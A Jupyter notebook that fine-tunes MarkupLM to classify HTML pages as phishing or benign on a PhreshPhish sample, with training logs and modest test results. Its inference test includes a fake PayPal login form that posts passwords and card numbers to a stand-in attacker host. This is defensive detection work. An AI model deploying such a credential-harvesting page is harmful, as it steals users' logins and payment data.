# Fine-tune MarkupLM for HTML phishing classification

Unlike `Fine_tune_MarkupLMForTokenClassification_on_a_custom_dataset.ipynb` (which labels
individual nodes, e.g. "this node is a price"), this notebook fine-tunes
`MarkupLMForSequenceClassification`: **one label per whole HTML page** (`benign` vs
`phishing`). That's the task the LinkGuard/Phisang flowchart's server-side
`is_benign?` decision actually needs.

Dataset: [PhreshPhish](https://huggingface.co/datasets/phreshphish/phreshphish) (CC BY 4.0,
anti-phishing research use) — 666K labeled pages with raw HTML in the `html` column, an
official train/test split, and a `target` brand field for phishing pages.

This notebook streams a **small stratified sample** (a few hundred pages) to prove the
pipeline end-to-end quickly on a laptop. Bump `NUM_TRAIN_PER_CLASS` etc. once you're ready
to run a real training job (ideally on a machine with more GPU memory/time).

In [1]:
import json
import random
from pathlib import Path

import torch
from datasets import load_dataset
from sklearn.metrics import accuracy_score, precision_recall_fscore_support, confusion_matrix
from torch.optim import AdamW
from torch.utils.data import DataLoader, Dataset
from tqdm.auto import tqdm
from transformers import MarkupLMFeatureExtractor, MarkupLMForSequenceClassification, MarkupLMProcessor

random.seed(42)

ARTIFACT_DIR = Path("artifacts/phishing-html-classifier-v0")

id2label = {0: "benign", 1: "phishing"}
label2id = {v: k for k, v in id2label.items()}
PHRESHPHISH_LABEL_TO_ID = {"benign": 0, "phish": 1}

/Users/juan/Juan/Project/Git/HackNusa/ai/markuplm/.venv/lib/python3.14/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html
  from .autonotebook import tqdm as notebook_tqdm


## 1. Stream a small stratified sample from PhreshPhish

We stream (not download-then-load) so we don't pull the full 666K-row dataset for a
quick demo run. We also skip pages that are implausibly tiny (parked-domain placeholders)
or huge (multi-hundred-KB obfuscated bundles) to keep per-page parsing time bounded —
drop this filter for a real training run.

In [ ]:
# The training script already downloaded and sampled pages into this cache.
# Reuse it: no re-download, and the sample spans several parquet shards instead
# of just the head of one file.
CACHE_DIR = Path("datasets/phreshphish_sample/train3000_val400_test400")

# How many cached pages to actually use, per class. Start small to check the
# pipeline, then raise (the cache holds ~3000 train / 400 val / 400 test per class).
USE_TRAIN_PER_CLASS = 400
USE_VAL_PER_CLASS = 100
USE_TEST_PER_CLASS = 100

MIN_HTML_CHARS = 200
MAX_HTML_CHARS = 150_000


def load_cached(name: str, per_class: int) -> list[dict]:
    """Read a balanced slice of the cached sample, stopping as soon as it's full."""
    counts = {0: 0, 1: 0}
    rows = []
    with (CACHE_DIR / f"{name}.jsonl").open() as handle:
        for line in handle:
            row = json.loads(line)
            label_id = row["label_id"]
            if counts[label_id] >= per_class:
                continue
            rows.append(row)
            counts[label_id] += 1
            if all(count >= per_class for count in counts.values()):
                break
    random.shuffle(rows)
    return rows


def stream_stratified_sample(split: str, num_per_class: dict[str, int]) -> list[dict]:
    """Fallback: pull rows straight from the Hub if the cache isn't there."""
    remaining = dict(num_per_class)
    collected: list[dict] = []
    ds = load_dataset("phreshphish/phreshphish", split=split, streaming=True)
    for example in ds:
        label = example["label"]
        if remaining.get(label, 0) <= 0:
            continue
        html = example["html"] or ""
        if not (MIN_HTML_CHARS <= len(html) <= MAX_HTML_CHARS):
            continue
        collected.append(
            {"html": html, "label": label, "label_id": PHRESHPHISH_LABEL_TO_ID[label], "url": example["url"]}
        )
        remaining[label] -= 1
        if all(v <= 0 for v in remaining.values()):
            break
    return collected


if CACHE_DIR.exists():
    print(f"using cached sample at {CACHE_DIR}")
    train_raw = load_cached("train", USE_TRAIN_PER_CLASS)
    val_raw = load_cached("val", USE_VAL_PER_CLASS)
    test_raw = load_cached("test", USE_TEST_PER_CLASS)
else:
    print("cache missing - streaming from the Hub (slower, smaller, less diverse)")
    train_raw = stream_stratified_sample(
        "train", {"benign": USE_TRAIN_PER_CLASS + USE_VAL_PER_CLASS, "phish": USE_TRAIN_PER_CLASS + USE_VAL_PER_CLASS}
    )
    random.shuffle(train_raw)
    val_raw = train_raw[: 2 * USE_VAL_PER_CLASS]
    train_raw = train_raw[2 * USE_VAL_PER_CLASS :]
    test_raw = stream_stratified_sample(
        "test", {"benign": USE_TEST_PER_CLASS, "phish": USE_TEST_PER_CLASS}
    )

print("train:", len(train_raw), "val:", len(val_raw), "test:", len(test_raw))

## 2. Extract nodes & xpaths from raw HTML

Real-world HTML (unlike the toy dataset) sometimes fails to parse cleanly — we skip
and count failures rather than crashing the whole run.

In [3]:
feature_extractor = MarkupLMFeatureExtractor()


def build_examples(raw_examples: list[dict]) -> list[dict]:
    examples = []
    failures = 0
    for item in tqdm(raw_examples):
        try:
            encoding = feature_extractor(item["html"])
        except Exception:
            failures += 1
            continue
        nodes = encoding["nodes"][0]
        xpaths = encoding["xpaths"][0]
        if not nodes:
            failures += 1
            continue
        examples.append(
            {
                "nodes": [nodes],
                "xpaths": [xpaths],
                "label_id": PHRESHPHISH_LABEL_TO_ID[item["label"]],
                "url": item["url"],
            }
        )
    if failures:
        print(f"skipped {failures}/{len(raw_examples)} pages (parse failure or empty DOM)")
    return examples


train_data = build_examples(train_raw)
val_data = build_examples(val_raw)
test_data = build_examples(test_raw)

print("usable — train:", len(train_data), "val:", len(val_data), "test:", len(test_data))


  0%|          | 0/160 [00:00<?, ?it/s]


  8%|▊         | 12/160 [00:00<00:01, 111.92it/s]


 16%|█▋        | 26/160 [00:00<00:01, 124.96it/s]


 24%|██▍       | 39/160 [00:00<00:01, 102.13it/s]


 47%|████▋     | 75/160 [00:00<00:00, 180.95it/s]

...


  0%|          | 0/60 [00:00<?, ?it/s]


 37%|███▋      | 22/60 [00:00<00:00, 193.63it/s]


 73%|███████▎  | 44/60 [00:00<00:00, 195.72it/s]


100%|██████████| 60/60 [00:00<00:00, 181.40it/s]

usable — train: 160 val: 39 test: 60


## 3. PyTorch Dataset (one label per page, not per node)

In [4]:
class HtmlPhishingDataset(Dataset):
    """Sequence-classification dataset: one page -> one benign/phishing label."""

    def __init__(self, data, processor, max_length=512):
        self.data = data
        self.processor = processor
        self.max_length = max_length

    def __len__(self):
        return len(self.data)

    def __getitem__(self, idx):
        item = self.data[idx]
        encoding = self.processor(
            nodes=item["nodes"],
            xpaths=item["xpaths"],
            truncation=True,
            padding="max_length",
            max_length=self.max_length,
            return_tensors="pt",
        )
        encoding = {k: v.squeeze(0) for k, v in encoding.items()}
        encoding["labels"] = torch.tensor(item["label_id"], dtype=torch.long)
        return encoding

## 4. Processor, datasets, dataloaders

In [5]:
processor = MarkupLMProcessor.from_pretrained("microsoft/markuplm-base")
processor.parse_html = False

train_dataset = HtmlPhishingDataset(train_data, processor)
val_dataset = HtmlPhishingDataset(val_data, processor)
test_dataset = HtmlPhishingDataset(test_data, processor)

BATCH_SIZE = 4
train_dataloader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)
val_dataloader = DataLoader(val_dataset, batch_size=BATCH_SIZE)
test_dataloader = DataLoader(test_dataset, batch_size=BATCH_SIZE)

## 5. Define the model

In [6]:
model = MarkupLMForSequenceClassification.from_pretrained(
    "microsoft/markuplm-base", num_labels=2, id2label=id2label, label2id=label2id
)

Some weights of MarkupLMForSequenceClassification were not initialized from the model checkpoint at microsoft/markuplm-base and are newly initialized: ['classifier.bias', 'classifier.weight']
You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.


## 6. Metrics helper

In [7]:
@torch.no_grad()
def evaluate_model(model, dataloader, device):
    model.eval()
    all_preds, all_labels = [], []
    for batch in dataloader:
        inputs = {k: v.to(device) for k, v in batch.items()}
        outputs = model(**inputs)
        preds = outputs.logits.argmax(dim=-1)
        all_preds.extend(preds.cpu().tolist())
        all_labels.extend(batch["labels"].cpu().tolist())
    accuracy = accuracy_score(all_labels, all_preds)
    precision, recall, f1, _ = precision_recall_fscore_support(
        all_labels, all_preds, average="binary", pos_label=1, zero_division=0
    )
    return {
        "accuracy": accuracy,
        "precision_phishing": precision,
        "recall_phishing": recall,
        "f1_phishing": f1,
        "n": len(all_labels),
    }, all_preds, all_labels

## 7. Train

In [8]:
if torch.cuda.is_available():
    device = torch.device("cuda")
elif torch.backends.mps.is_available():
    device = torch.device("mps")
else:
    device = torch.device("cpu")
print("Using device:", device)

model.to(device)
optimizer = AdamW(model.parameters(), lr=3e-5)

NUM_EPOCHS = 3
for epoch in range(NUM_EPOCHS):
    model.train()
    running_loss = 0.0
    for batch in tqdm(train_dataloader, desc=f"epoch {epoch}"):
        inputs = {k: v.to(device) for k, v in batch.items()}
        optimizer.zero_grad()
        outputs = model(**inputs)
        loss = outputs.loss
        loss.backward()
        optimizer.step()
        running_loss += loss.item()

    val_metrics, _, _ = evaluate_model(model, val_dataloader, device)
    print(f"epoch {epoch}: train_loss={running_loss / len(train_dataloader):.4f} val={val_metrics}")

Using device: mps



epoch 0:   0%|          | 0/40 [00:00<?, ?it/s]


epoch 0:   2%|▎         | 1/40 [00:02<01:18,  2.02s/it]


epoch 0:   5%|▌         | 2/40 [00:02<00:48,  1.26s/it]


epoch 0:   8%|▊         | 3/40 [00:03<00:37,  1.00s/it]

...


epoch 2:  95%|█████████▌| 38/40 [00:26<00:01,  1.42it/s]


epoch 2:  98%|█████████▊| 39/40 [00:27<00:00,  1.43it/s]


epoch 2: 100%|██████████| 40/40 [00:28<00:00,  1.42it/s]


epoch 2: 100%|██████████| 40/40 [00:28<00:00,  1.42it/s]

epoch 2: train_loss=0.3363 val={'accuracy': 0.7948717948717948, 'precision_phishing': 0.6875, 'recall_phishing': 0.7857142857142857, 'f1_phishing': 0.7333333333333333, 'n': 39}


## 8. Evaluate on the held-out test sample

In [9]:
test_metrics, test_preds, test_labels = evaluate_model(model, test_dataloader, device)
print("test:", test_metrics)
print("confusion matrix [[TN, FP], [FN, TP]]:")
print(confusion_matrix(test_labels, test_preds))

test: {'accuracy': 0.65, 'precision_phishing': 0.6551724137931034, 'recall_phishing': 0.6333333333333333, 'f1_phishing': 0.6440677966101694, 'n': 60}
confusion matrix [[TN, FP], [FN, TP]]:
[[20 10]
 [11 19]]


## 9. Save the fine-tuned artifact

In [10]:
ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)
model.save_pretrained(ARTIFACT_DIR)
processor.save_pretrained(ARTIFACT_DIR)

metadata = {
    "base_model": "microsoft/markuplm-base",
    "task": "sequence-classification",
    "id2label": id2label,
    "train_dataset": "phreshphish/phreshphish",
    "train_n": len(train_data),
    "val_n": len(val_data),
    "test_n": len(test_data),
    "test_metrics": test_metrics,
    "note": "Small demo sample — not production-grade. Scale up NUM_*_PER_CLASS and retrain before relying on this.",
}
(ARTIFACT_DIR / "metadata.json").write_text(json.dumps(metadata, indent=2))
print("saved to", ARTIFACT_DIR.resolve())

saved to /Users/juan/Juan/Project/Git/HackNusa/ai/markuplm/artifacts/phishing-html-classifier-v0


## 10. Quick inference smoke test

In [11]:
loaded_processor = MarkupLMProcessor.from_pretrained(ARTIFACT_DIR)
loaded_processor.parse_html = False
loaded_model = MarkupLMForSequenceClassification.from_pretrained(ARTIFACT_DIR).to(device)
loaded_model.eval()

samples = {
    "plain_benign": "<html><head><title>My Blog</title></head><body><h1>Welcome</h1><p>Just a personal blog about hiking.</p></body></html>",
    "fake_login": """
    <html><head><title>Verify Your Account - Secure Login</title></head>
    <body>
    <img src=\"logo.png\" alt=\"PayPal\">
    <h2>Your account has been limited. Please verify your identity.</h2>
    <form action=\"http://totally-not-paypal.example.ru/steal\" method=\"post\">
    <input type=\"text\" name=\"email\" placeholder=\"Email\">
    <input type=\"password\" name=\"password\" placeholder=\"Password\">
    <input type=\"text\" name=\"card_number\" placeholder=\"Card number\">
    <button type=\"submit\">Confirm Identity</button>
    </form>
    </body></html>
    """,
}

for name, html in samples.items():
    encoding = feature_extractor(html)
    inputs = loaded_processor(
        nodes=encoding["nodes"], xpaths=encoding["xpaths"], truncation=True, max_length=512, return_tensors="pt"
    ).to(device)
    with torch.no_grad():
        logits = loaded_model(**inputs).logits
    probs = torch.softmax(logits, dim=-1)[0]
    pred_id = probs.argmax().item()
    print(f"{name}: predicted={id2label[pred_id]} probs={ {id2label[i]: round(p, 3) for i, p in enumerate(probs.tolist())} }")

plain_benign: predicted=phishing probs={'benign': 0.167, 'phishing': 0.833}
fake_login: predicted=phishing probs={'benign': 0.08, 'phishing': 0.92}
